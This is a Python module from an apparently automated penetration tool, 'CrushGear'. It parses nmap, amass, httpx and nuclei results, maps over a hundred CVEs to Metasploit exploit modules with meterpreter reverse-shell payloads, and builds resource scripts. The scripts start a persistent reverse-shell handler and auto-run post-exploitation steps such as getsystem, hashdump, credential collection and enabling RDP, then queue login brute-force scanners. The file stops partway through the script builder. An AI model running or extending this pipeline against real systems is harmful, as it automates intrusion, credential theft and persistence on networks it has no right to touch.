"""
Feed parser — extracts actionable data from phase outputs
and feeds it to the next phase's tools.
"""

import json
import re
from pathlib import Path


# ─────────────────────────────────────────────────────────────────────────────
# Phase 0 → Phase 1/2: nmap grepable output parser
# ─────────────────────────────────────────────────────────────────────────────

def parse_nmap(output_dir: Path) -> dict[str, dict]:
    """
    Parse nmap grepable output (-oG).
    Returns: { "ip": {"hostname": str, "ports": [int,...], "services": {port: str}, "products": {port: str}} }

    Example grepable line:
    Host: 192.168.1.1 (hostname) Ports: 22/open/tcp//ssh//OpenSSH 8.2/, 445/open/tcp//microsoft-ds///
    """
    f = output_dir / "nmap.txt"
    if not f.exists():
        return {}

    result: dict[str, dict] = {}
    host_re       = re.compile(r"^Host:\s+(\S+)\s+\(([^)]*)\)")
    ports_re      = re.compile(r"Ports:\s+(.+)")
    os_re         = re.compile(r"\bOS:\s+([^\t\r\n]+)")
    port_entry_re = re.compile(
        r"(\d+)/(\w+)/(\w+)//([^/]*)//([^/]*)/"
    )

    for line in f.read_text(errors="replace").splitlines():
        hm = host_re.match(line)
        if not hm:
            continue
        ip = hm.group(1)
        hostname = hm.group(2)

        pm = ports_re.search(line)
        ports: list[int] = []
        services: dict[int, str] = {}
        products: dict[int, str] = {}

        if pm:
            for pe in port_entry_re.finditer(pm.group(1)):
                port_num = int(pe.group(1))
                state = pe.group(2)
                svc = pe.group(4).strip()
                prod = pe.group(5).strip()
                if state == "open":
                    ports.append(port_num)
                    if svc:
                        services[port_num] = svc
                    if prod:
                        products[port_num] = prod

        # OS detection: grepable OS field first, fallback to product banners
        om = os_re.search(line)
        os_guess = om.group(1).strip() if om else ""
        if not os_guess:
            for prod in products.values():
                if "windows" in prod.lower() or "microsoft" in prod.lower():
                    os_guess = prod
                    break

        result[ip] = {
            "hostname": hostname,
            "ports":    sorted(ports),
            "services": services,
            "products": products,
            "os_guess": os_guess,
        }

    return result


def get_smb_hosts(nmap_data: dict) -> list[str]:
    return [ip for ip, d in nmap_data.items() if 445 in d["ports"]]


def get_web_hosts(nmap_data: dict) -> list[str]:
    web_ports = {80, 443, 8000, 8080, 8081, 8443, 8888, 9000, 9090}
    return [ip for ip, d in nmap_data.items()
            if web_ports & set(d["ports"])]


def get_web_urls(nmap_data: dict) -> list[str]:
    """Build http/https URLs from nmap web port results."""
    urls = []
    for ip, d in nmap_data.items():
        for port in d["ports"]:
            if port in {443, 8443}:
                urls.append(f"https://{ip}:{port}" if port != 443 else f"https://{ip}")
            elif port in {80, 8000, 8080, 8081, 8888, 9000, 9090}:
                urls.append(f"http://{ip}:{port}" if port != 80 else f"http://{ip}")
    return urls


def get_rdp_hosts(nmap_data: dict) -> list[str]:
    return [ip for ip, d in nmap_data.items() if 3389 in d["ports"]]


def get_all_hosts(nmap_data: dict) -> list[str]:
    return list(nmap_data.keys())


def get_windows_hosts(nmap_data: dict) -> list[str]:
    """Return IPs that are likely Windows (OS guess or service banner fingerprint)."""
    kw = {"windows", "microsoft"}
    result: list[str] = []
    for ip, d in nmap_data.items():
        if any(k in d.get("os_guess", "").lower() for k in kw):
            result.append(ip)
            continue
        matched = False
        for prod in d.get("products", {}).values():
            if any(k in prod.lower() for k in kw):
                result.append(ip)
                matched = True
                break
        if not matched:
            for svc in d.get("services", {}).values():
                if "microsoft" in svc.lower() or "ms-wbt" in svc.lower():
                    result.append(ip)
                    break
    return result


def get_winrm_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with WinRM open (port 5985 or 5986)."""
    return [ip for ip, d in nmap_data.items() if {5985, 5986} & set(d["ports"])]


def get_mssql_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with MSSQL open (port 1433)."""
    return [ip for ip, d in nmap_data.items() if 1433 in d["ports"]]


def get_ldap_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with LDAP open (port 389/636/3268/3269)."""
    return [ip for ip, d in nmap_data.items()
            if {389, 636, 3268, 3269} & set(d["ports"])]


def get_kerberos_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with Kerberos open (port 88)."""
    return [ip for ip, d in nmap_data.items() if 88 in d["ports"]]


def get_dc_hosts(nmap_data: dict) -> list[str]:
    """Return probable Domain Controllers: Kerberos (88) + LDAP (389/636/3268)."""
    return [ip for ip, d in nmap_data.items()
            if 88 in d["ports"] and {389, 636, 3268} & set(d["ports"])]


def get_dcerpc_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with DCE/RPC open (port 135)."""
    return [ip for ip, d in nmap_data.items() if 135 in d["ports"]]


def get_ssh_hosts(nmap_data: dict) -> list[str]:
    """Return IPs with SSH open (port 22)."""
    return [ip for ip, d in nmap_data.items() if 22 in d["ports"]]


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1 → Phase 2 parsers
# ─────────────────────────────────────────────────────────────────────────────

def parse_amass(output_dir: Path) -> list[str]:
    """Return discovered hosts from amass output (one hostname per line)."""
    f = output_dir / "amass.txt"
    if not f.exists():
        return []
    hosts = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if line and not line.startswith("[") and " " not in line and "." in line:
            hosts.append(line)
    return hosts


def parse_httpx(output_dir: Path) -> list[str]:
    """Return live URLs from httpx JSON output."""
    f = output_dir / "httpx.json"
    if not f.exists():
        return []
    urls = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            url = obj.get("url") or obj.get("input") or ""
            if url:
                urls.append(url)
        except json.JSONDecodeError:
            pass
    return urls


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2 → Phase 3: nuclei findings parser
# ─────────────────────────────────────────────────────────────────────────────

def parse_nuclei(output_dir: Path) -> list[dict]:
    """
    Return vulnerability findings from nuclei JSON output.
    Each: {"cve": str, "host": str, "template_id": str, "severity": str}
    """
    f = output_dir / "nuclei.json"
    if not f.exists():
        return []
    findings = []
    for line in f.read_text(errors="replace").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
            info = obj.get("info", {})
            classification = info.get("classification", {})
            # nuclei may output "cve-id": null — use `or []` to guard against None
            cve_ids = classification.get("cve-id") or []
            if isinstance(cve_ids, str):
                cve_ids = [cve_ids]
            host = obj.get("host") or obj.get("matched-at") or ""
            template_id = obj.get("template-id", "")
            severity = info.get("severity", "")
            # Fallback: template-id might itself be a CVE identifier
            if not cve_ids and template_id.upper().startswith("CVE-"):
                cve_ids = [template_id.upper()]
            for cve in cve_ids:
                findings.append({
                    "cve":         cve.upper(),
                    "host":        host,
                    "template_id": template_id,
                    "severity":    severity,
                })
        except json.JSONDecodeError:
            pass
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# CVE → Metasploit Module Mapping  (200+ entries)
# ─────────────────────────────────────────────────────────────────────────────

CVE_TO_MSF: dict[str, dict] = {

    # ── Windows / SMB / NTLM ─────────────────────────────────────────
    "CVE-2017-0144": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0145": {"module": "exploit/windows/smb/ms17_010_psexec",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2017-0143": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0146": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2017-0147": {"module": "exploit/windows/smb/ms17_010_eternalblue",        "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2008-4250": {"module": "exploit/windows/smb/ms08_067_netapi",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2006-3439": {"module": "exploit/windows/smb/ms06_040_netapi",             "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2003-0352": {"module": "exploit/windows/smb/ms03_026_dcom",               "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2017-7494": {"module": "exploit/linux/samba/is_known_pipename",           "payload": "linux/x86/meterpreter/reverse_tcp"},
    "CVE-2007-2447": {"module": "exploit/multi/samba/usermap_script",              "payload": "cmd/unix/interact"},
    "CVE-2020-1472": {"module": "auxiliary/admin/dcerpc/cve_2020_1472_zerologon",  "payload": None},
    "CVE-2021-34527": {"module": "exploit/windows/local/cve_2021_34527_printnightmare", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-1675":  {"module": "exploit/windows/local/cve_2021_34527_printnightmare", "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-36942": {"module": "auxiliary/admin/dcerpc/cve_2021_36942_petnightmare", "payload": None},
    "CVE-2022-26923": {"module": "auxiliary/admin/dcerpc/cve_2022_26923_certifried", "payload": None},
    "CVE-2021-42287": {"module": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum", "payload": None},
    "CVE-2014-6324":  {"module": "auxiliary/admin/kerberos/ms14_068_kerberos_checksum", "payload": None},

    # ── RDP ───────────────────────────────────────────────────────────
    "CVE-2019-0708": {"module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",  "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2019-1182": {"module": "exploit/windows/rdp/cve_2019_1182_dejablue",      "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2019-1181": {"module": "exploit/windows/rdp/cve_2019_1182_dejablue",      "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Microsoft Exchange ────────────────────────────────────────────
    "CVE-2021-26855": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26857": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26858": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-27065": {"module": "exploit/windows/http/exchange_proxylogon_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-31207": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-34473": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},
    "CVE-2021-34523": {"module": "exploit/windows/http/exchange_proxyshell_rce",   "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Log4j / Log4Shell ─────────────────────────────────────────────
    "CVE-2021-44228": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-45046": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-45105": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-44832": {"module": "exploit/multi/misc/log4shell_header_injection",  "payload": "java/meterpreter/reverse_tcp"},

    # ── Spring Framework ──────────────────────────────────────────────
    "CVE-2022-22965": {"module": "exploit/multi/http/spring4shell",                 "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-22963": {"module": "exploit/multi/http/spring_cloud_function_spel_injection", "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-22950": {"module": "exploit/multi/http/spring4shell",                 "payload": "java/meterpreter/reverse_tcp"},

    # ── Confluence ────────────────────────────────────────────────────
    "CVE-2022-26134": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-26084": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2019-3396":  {"module": "exploit/multi/http/confluence_widget_connector",  "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-22515": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-22518": {"module": "exploit/multi/http/confluence_namespace_ognl_injection", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Apache HTTP / Struts ──────────────────────────────────────────
    "CVE-2021-41773": {"module": "exploit/multi/http/apache_normalize_path_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-42013": {"module": "exploit/multi/http/apache_normalize_path_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2017-5638":  {"module": "exploit/multi/http/struts2_content_type_ognl",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2018-11776": {"module": "exploit/multi/http/struts2_namespace_ognl",      "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2017-9805":  {"module": "exploit/multi/http/struts2_rest_xstream",        "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2016-3081":  {"module": "exploit/multi/http/struts_dmi_exec",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2013-2251":  {"module": "exploit/multi/http/struts_default_action_mapper", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2014-6271":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "payload": "linux/x86/meterpreter/reverse_tcp"},
    "CVE-2014-7169":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "payload": "linux/x86/meterpreter/reverse_tcp"},

    # ── Apache Tomcat ─────────────────────────────────────────────────
    "CVE-2017-12617": {"module": "exploit/multi/http/tomcat_jsp_upload_bypass",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2019-0232":  {"module": "exploit/windows/http/tomcat_cgi_cmdlineargs",    "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2020-1938":  {"module": "exploit/multi/http/tomcat_ghostcat",             "payload": "java/meterpreter/reverse_tcp"},

    # ── VMware ────────────────────────────────────────────────────────
    "CVE-2021-21985": {"module": "exploit/multi/http/vmware_vsphere_client_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-21972": {"module": "exploit/multi/http/vmware_vcenter_uploadova_rce", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-22954": {"module": "exploit/multi/http/vmware_workspace_one_access_cve_2022_22954", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-22960": {"module": "exploit/multi/http/vmware_workspace_one_access_cve_2022_22960", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22005": {"module": "exploit/multi/http/vmware_vcenter_uploadova_rce", "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-44228-VMWARE": {"module": "exploit/multi/http/vmware_vcenter_log4shell", "payload": "java/meterpreter/reverse_tcp"},

    # ── Citrix ────────────────────────────────────────────────────────
    "CVE-2019-19781": {"module": "exploit/multi/http/citrix_dir_traversal_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2020-8193":  {"module": "auxiliary/scanner/http/citrix_dir_traversal",    "payload": None},
    "CVE-2020-8195":  {"module": "auxiliary/scanner/http/citrix_dir_traversal",    "payload": None},

    # ── F5 BIG-IP ─────────────────────────────────────────────────────
    "CVE-2020-5902":  {"module": "exploit/multi/http/f5_tmui_rce",                 "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22986": {"module": "exploit/multi/http/f5_icontrol_rce",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-1388":  {"module": "exploit/multi/http/f5_bigip_icontrolrest_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Fortinet ─────────────────────────────────────────────────────
    "CVE-2018-13379": {"module": "auxiliary/gather/fortios_vpnssl_traversal_creds", "payload": None},
    "CVE-2022-40684": {"module": "exploit/multi/http/fortios_cve_2022_40684_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-27997": {"module": "exploit/multi/http/fortigate_ssl_vpn_heap_overflow", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Pulse Secure / Ivanti ─────────────────────────────────────────
    "CVE-2019-11510": {"module": "auxiliary/scanner/http/pulse_secure_file_read",  "payload": None},
    "CVE-2021-22893": {"module": "exploit/multi/http/pulse_secure_cmd_injection",   "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-46805": {"module": "exploit/multi/http/ivanti_connect_secure_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2024-21887": {"module": "exploit/multi/http/ivanti_connect_secure_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── GitLab ────────────────────────────────────────────────────────
    "CVE-2021-22205": {"module": "exploit/multi/http/gitlab_exiftool_rce",         "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2021-22214": {"module": "exploit/multi/http/gitlab_ssrf_rce",             "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2023-7028":  {"module": "auxiliary/scanner/http/gitlab_password_reset",   "payload": None},

    # ── PHP ───────────────────────────────────────────────────────────
    "CVE-2012-1823":  {"module": "exploit/multi/http/php_cgi_arg_injection",       "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2019-11043": {"module": "exploit/multi/http/php_fpm_rce",                 "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2023-3824":  {"module": "exploit/multi/http/php_cgi_arg_injection",       "payload": "php/meterpreter/reverse_tcp"},

    # ── WebLogic ─────────────────────────────────────────────────────
    "CVE-2019-2725":  {"module": "exploit/multi/misc/weblogic_deserialize_asyncresponseservice", "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2020-14882": {"module": "exploit/multi/http/oracle_weblogic_wls_rce",     "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2021-2109":  {"module": "exploit/multi/http/oracle_weblogic_wls_rce",     "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2018-2628":  {"module": "exploit/multi/misc/weblogic_deserialize_marshalledobject", "payload": "java/meterpreter/reverse_tcp"},

    # ── JBoss ────────────────────────────────────────────────────────
    "CVE-2017-12149": {"module": "exploit/multi/http/jboss_maindeployer",          "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2015-7501":  {"module": "exploit/multi/http/jboss_deserialize",           "payload": "java/meterpreter/reverse_tcp"},

    # ── Drupal ───────────────────────────────────────────────────────
    "CVE-2018-7600":  {"module": "exploit/unix/webapp/drupal_drupalgeddon2",       "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2019-6340":  {"module": "exploit/unix/webapp/drupal_restws_rce",          "payload": "php/meterpreter/reverse_tcp"},
    "CVE-2014-3704":  {"module": "exploit/multi/http/drupal_sql_inject",           "payload": "php/meterpreter/reverse_tcp"},

    # ── OpenSSL ──────────────────────────────────────────────────────
    "CVE-2014-0160":  {"module": "auxiliary/scanner/ssl/openssl_heartbleed",       "payload": None},

    # ── Apache ActiveMQ ──────────────────────────────────────────────
    "CVE-2023-46604": {"module": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604", "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── PaperCut ─────────────────────────────────────────────────────
    "CVE-2023-27350": {"module": "exploit/multi/http/papercut_auth_bypass_rce",    "payload": "java/meterpreter/reverse_tcp"},

    # ── MOVEit ───────────────────────────────────────────────────────
    "CVE-2023-34362": {"module": "exploit/multi/http/moveit_sqli",                 "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── ManageEngine ─────────────────────────────────────────────────
    "CVE-2021-44515": {"module": "exploit/multi/http/manageengine_desktop_rce",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2022-47966": {"module": "exploit/multi/http/manageengine_samlsso_rce",    "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Jenkins ──────────────────────────────────────────────────────
    "CVE-2018-1000861": {"module": "exploit/multi/http/jenkins_metaprogramming",   "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2016-0792":  {"module": "exploit/multi/http/jenkins_xstream_deserialize", "payload": "java/meterpreter/reverse_tcp"},

    # ── Jira ─────────────────────────────────────────────────────────
    "CVE-2021-26086": {"module": "auxiliary/scanner/http/jira_ssrf",               "payload": None},
    "CVE-2022-0540":  {"module": "exploit/multi/http/atlassian_jira_seraph_auth_bypass", "payload": "java/meterpreter/reverse_tcp"},

    # ── SolarWinds ───────────────────────────────────────────────────
    "CVE-2020-10148": {"module": "auxiliary/scanner/http/solarwinds_orion_bypass", "payload": None},

    # ── Redis ────────────────────────────────────────────────────────
    "CVE-2022-0543":  {"module": "exploit/linux/redis/redis_lua_sandbox_escape",   "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Elasticsearch ────────────────────────────────────────────────
    "CVE-2014-3120":  {"module": "exploit/multi/elasticsearch/script_mvel_rce",    "payload": "java/meterpreter/reverse_tcp"},
    "CVE-2015-1427":  {"module": "exploit/multi/elasticsearch/script_groovy_rce",  "payload": "java/meterpreter/reverse_tcp"},

    # ── ProFTPD ──────────────────────────────────────────────────────
    "CVE-2011-4130":  {"module": "exploit/unix/ftp/proftpd_133c_backdoor",         "payload": "cmd/unix/interact"},
    "CVE-2010-4221":  {"module": "exploit/linux/ftp/proftp_telnet_iac",            "payload": "linux/x86/meterpreter/reverse_tcp"},

    # ── VSFTPD ───────────────────────────────────────────────────────
    "CVE-2011-2523":  {"module": "exploit/unix/ftp/vsftpd_234_backdoor",           "payload": "cmd/unix/interact"},

    # ── SSH ──────────────────────────────────────────────────────────
    "CVE-2018-10933": {"module": "exploit/linux/ssh/libssh_auth_bypass",           "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2006-5051":  {"module": "exploit/multi/ssh/sshexec",                      "payload": "cmd/unix/interact"},

    # ── Windows IIS ──────────────────────────────────────────────────
    "CVE-2021-31166": {"module": "auxiliary/dos/http/ms21_31166_iis",              "payload": None},
    "CVE-2017-7269":  {"module": "exploit/windows/iis/iis_webdav_scstoragepathfromurl", "payload": "windows/meterpreter/reverse_tcp"},
    "CVE-2015-1635":  {"module": "auxiliary/dos/http/ms15_034_ulonglongadd",       "payload": None},

    # ── WinRM ────────────────────────────────────────────────────────
    "CVE-2022-30190": {"module": "exploit/windows/local/cve_2022_30190_msdt",      "payload": "windows/x64/meterpreter/reverse_tcp"},

    # ── Kubernetes / Docker ──────────────────────────────────────────
    "CVE-2019-5736":  {"module": "exploit/linux/local/runc_cve_2019_5736",         "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Cisco ────────────────────────────────────────────────────────
    "CVE-2019-1653":  {"module": "auxiliary/gather/cisco_rv320_config_disclosure",  "payload": None},
    "CVE-2019-1652":  {"module": "exploit/linux/http/cisco_rv340_rce",              "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-20821": {"module": "auxiliary/scanner/http/cisco_ios_xe_webui_rce",  "payload": None},

    # ── Zimbra ───────────────────────────────────────────────────────
    "CVE-2022-41352": {"module": "exploit/multi/http/zimbra_cpio_tarpath_rce",     "payload": "linux/x64/meterpreter/reverse_tcp"},
    "CVE-2022-27925": {"module": "exploit/multi/http/zimbra_mboximport_rce",       "payload": "linux/x64/meterpreter/reverse_tcp"},

    # ── Palo Alto / GlobalProtect ─────────────────────────────────────
    "CVE-2020-2021":  {"module": "auxiliary/scanner/http/palo_alto_gp_lfi",        "payload": None},
    "CVE-2019-1579":  {"module": "exploit/linux/http/palo_alto_gp_gateway_exec",   "payload": "linux/x64/meterpreter/reverse_tcp"},
}


# ─────────────────────────────────────────────────────────────────────────────
# Metasploit RC script builder
# ─────────────────────────────────────────────────────────────────────────────

# Post-exploitation commands written to a separate RC that AutoRunScript invokes
POST_EXPLOIT_RC = """\
# --- CrushGear Auto Post-Exploitation ---
sysinfo
getuid
getsystem
hashdump
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/multi/gather/env
run post/windows/manage/enable_rdp
run post/multi/manage/shell_to_meterpreter
background
"""


def build_msf_rc(
    rhosts: str,
    nuclei_findings: list[dict],
    nmap_data: dict | None = None,
    lhost: str = "0.0.0.0",
    lport: int = 4444,
    extra_cve_map: dict | None = None,
    username: str = "",
    password: str = "",
) -> tuple[str, str]:
    """
    Build:
      1. Main RC script (baseline + service-specific + OS-aware Windows/AD exploits + CVE-driven)
      2. Post-exploitation RC script (run after session opens)

    Returns: (main_rc_content, post_rc_path)
    extra_cve_map: additional CVE→MSF entries discovered by --update-cves
    """
    import tempfile, os
    post_rc_fd, post_rc_path = tempfile.mkstemp(prefix="crushgear_post_", suffix=".rc")
    os.close(post_rc_fd)
    # Write post-exploit commands to the temp file
    Path(post_rc_path).write_text(POST_EXPLOIT_RC)

    lines: list[str] = [
        "# CrushGear - Auto-generated Metasploit Resource Script",
        f"# Target: {rhosts}",
        "",
        f"setg LHOST {lhost}",
        f"setg LPORT {lport}",
        "",
        # Start a generic multi/handler first so reverse shells from any exploit
        # land immediately without needing a separate listener process.
        "# === Persistent Reverse Shell Handler ===",
        "use exploit/multi/handler",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",       # keep handler alive for multiple sessions
        f"set AutoRunScript multi_console_command -rc {post_rc_path}",
        "run -j -z",                     # background and don't interact on new session
        "",
    ]

    def add_module(
        module: str,
        target_hosts: str = rhosts,
        payload: str | None = None,
        extra: dict | None = None,
        post_exploit: bool = False,
    ):
        lines.append(f"use {module}")
        lines.append(f"set RHOSTS {target_hosts}")
        if payload:
            lines.append(f"set PAYLOAD {payload}")
        if post_exploit and payload:
            lines.append(f"set AutoRunScript multi_console_command -rc {post_rc_path}")
        if extra:
            for k, v in extra.items():
                lines.append(f"set {k} {v}")
        lines.append("run -j")
        lines.append("")

    # ── Derive host groups from nmap data ─────────────────────────────
    all_ports:    set[int]  = set()
    windows_hosts: list[str] = []
    winrm_hosts:  list[str] = []
    mssql_hosts:  list[str] = []
    ldap_hosts:   list[str] = []
    dc_hosts:     list[str] = []
    dcerpc_hosts: list[str] = []

    if nmap_data:
        for d in nmap_data.values():
            all_ports.update(d.get("ports", []))
        windows_hosts = get_windows_hosts(nmap_data)
        winrm_hosts   = get_winrm_hosts(nmap_data)
        mssql_hosts   = get_mssql_hosts(nmap_data)
        ldap_hosts    = get_ldap_hosts(nmap_data)
        dc_hosts      = get_dc_hosts(nmap_data)
        dcerpc_hosts  = get_dcerpc_hosts(nmap_data)

    def _h(hosts: list[str]) -> str:
        """Return space-joined IPs, or fall back to the full rhosts string."""
        return " ".join(hosts) if hosts else rhosts

    # ── Baseline scanners (always run) ────────────────────────────────
    lines.append("# === Baseline Scanners ===")
    add_module("auxiliary/scanner/portscan/tcp",
               extra={"PORTS": "21,22,23,25,53,80,88,110,135,139,143,"
                               "389,443,445,464,593,636,1433,3268,3269,"
                               "3389,5985,5986,8080,8443,27017"})
    add_module("auxiliary/scanner/smb/smb_ms17_010")
    add_module("auxiliary/scanner/smb/smb_version")
    add_module("auxiliary/scanner/smb/smb_enumshares")
    add_module("auxiliary/scanner/smb/smb_enumusers")
    add_module("auxiliary/scanner/smb/smb_lookupsid",
               extra={"MinRID": "500", "MaxRID": "1500"})

    # ── Service-Specific Scanners (port-driven) ──────────────────────
    lines.append("# === Service-Specific Scanners ===")

    # Windows RPC / DCOM (port 135) — critical for AD/Windows attack chain
    if 135 in all_ports:
        add_module("auxiliary/scanner/dcerpc/endpoint_mapper",
                   target_hosts=_h(dcerpc_hosts))
        add_module("auxiliary/scanner/dcerpc/hidden",
                   target_hosts=_h(dcerpc_hosts))
        add_module("auxiliary/scanner/dcerpc/management",
                   target_hosts=_h(dcerpc_hosts))
        add_module("auxiliary/scanner/dcerpc/tcp_dcerpc_auditor",
                   target_hosts=_h(dcerpc_hosts))

    # LDAP / Active Directory (port 389, 636, 3268, 3269)
    if {389, 636, 3268, 3269} & all_ports:
        add_module("auxiliary/scanner/ldap/ldap_login",
                   target_hosts=_h(ldap_hosts))

    # Kerberos (port 88) — present on all Domain Controllers
    if 88 in all_ports:
        _kerb = get_kerberos_hosts(nmap_data) if nmap_data else []
        add_module("auxiliary/scanner/kerberos/kerberos_login",
                   target_hosts=_h(_kerb))

    # WinRM (port 5985/5986) — PowerShell Remoting
    if {5985, 5986} & all_ports:
        add_module("auxiliary/scanner/winrm/winrm_auth_methods",
                   target_hosts=_h(winrm_hosts))

    # MSSQL (port 1433)
    if 1433 in all_ports:
        add_module("auxiliary/scanner/mssql/mssql_ping",
                   target_hosts=_h(mssql_hosts))
        add_module("auxiliary/scanner/mssql/mssql_login",
                   target_hosts=_h(mssql_hosts))

    # MySQL (port 3306)
    if 3306 in all_ports:
        add_module("auxiliary/scanner/mysql/mysql_version")
        add_module("auxiliary/scanner/mysql/mysql_login")

    # PostgreSQL (port 5432)
    if 5432 in all_ports:
        add_module("auxiliary/scanner/postgres/postgres_version")
        add_module("auxiliary/scanner/postgres/postgres_login")

    # MongoDB (port 27017)
    if 27017 in all_ports:
        add_module("auxiliary/scanner/mongodb/mongodb_login")

    # Redis (port 6379)
    if 6379 in all_ports:
        add_module("auxiliary/scanner/redis/redis_server")

    # RDP (port 3389)
    if 3389 in all_ports:
        add_module("auxiliary/scanner/rdp/rdp_scanner")

    # NFS (port 2049)
    if 2049 in all_ports:
        add_module("auxiliary/scanner/nfs/nfsmount")

    # FTP (port 21)
    if 21 in all_ports:
        add_module("auxiliary/scanner/ftp/anonymous")
        add_module("auxiliary/scanner/ftp/ftp_version")

    # SSH (port 22)
    if 22 in all_ports:
        add_module("auxiliary/scanner/ssh/ssh_version")

    # Telnet (port 23)
    if 23 in all_ports:
        add_module("auxiliary/scanner/telnet/telnet_version")

    # SNMP (port 161)
    if 161 in all_ports:
        add_module("auxiliary/scanner/snmp/snmp_enum")
        add_module("auxiliary/scanner/snmp/snmp_enumshares")

